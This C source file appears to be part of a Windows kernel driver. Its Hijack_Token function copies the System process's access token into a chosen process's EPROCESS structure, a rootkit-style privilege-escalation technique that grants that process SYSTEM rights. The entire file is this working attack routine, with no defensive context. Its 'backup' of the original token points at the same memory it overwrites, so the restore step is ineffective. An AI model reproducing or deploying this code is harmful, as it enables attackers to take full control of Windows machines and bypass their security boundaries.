#include "TokenHijack.h"


ULONG Hijack_Token(INT64 Pid)
{
#ifdef _DEBUG 
	DbgPrint("[+]Hijack_Token() Function Called\n");
#endif
	
	ULONG				 status = 0;
	PEPROCESS			pid4 = NULL,
					   ourEP = NULL;
	PEX_FAST_REF	  og_Ref = NULL,
				     our_Ref = NULL,
				  target_Ref = NULL;

	
	///securing memory for structs
	RtlSecureZeroMemory(&og_Ref, sizeof(PEX_FAST_REF));
	RtlSecureZeroMemory(&our_Ref, sizeof(PEX_FAST_REF));
	RtlSecureZeroMemory(&target_Ref, sizeof(PEX_FAST_REF));


	
	if (NT_SUCCESS(status = PsLookupProcessByProcessId(C_PTR(_SYS), &pid4)))
	{	
		
		if (!NT_SUCCESS(status = PsLookupProcessByProcessId(C_PTR(Pid), &ourEP)))
		{

			status = STATUS_FAILED_EPROCESS;
			goto end;
		}
	}
	else
	{	
		status = STATUS_FAILED_EPROCESS;
		goto end;
	}
	
	///saving for later incase of problems
	og_Ref = (PEX_FAST_REF)((ULONG_PTR)ourEP + Token);
	
	///getting tokens
	target_Ref = (PEX_FAST_REF)((ULONG_PTR)pid4 + Token);
	our_Ref = (PEX_FAST_REF)((ULONG_PTR)ourEP + Token);

	if (target_Ref != NULL)
	{
		///swap
		our_Ref->T.Object = target_Ref->T.Object;
		our_Ref->T.Value = target_Ref->T.Value;
		
	}
	else
	{
		status = STATUS_NO_TOKEN_ADDRESS;
		goto end;
	}
	///final check
	if (our_Ref->T.Object != target_Ref->T.Object &&
		our_Ref->T.Value != target_Ref->T.Value)
	{
		
		our_Ref->T.Object = og_Ref->T.Object;
		our_Ref->T.Value = og_Ref->T.Value;
		
		status = STATUS_FAILED_TOKEN_SWAP;
		goto end;
	}
	else
	{
		status = STATUS_SUCCESS;
	}


	
	end:
	ObDereferenceObject(ourEP);
	ObDereferenceObject(pid4);
	

#ifdef _DEBUG 
	DbgPrint("[+]Operation Successfull With Status 0x%I64x\n", status);
#endif
	return status;
}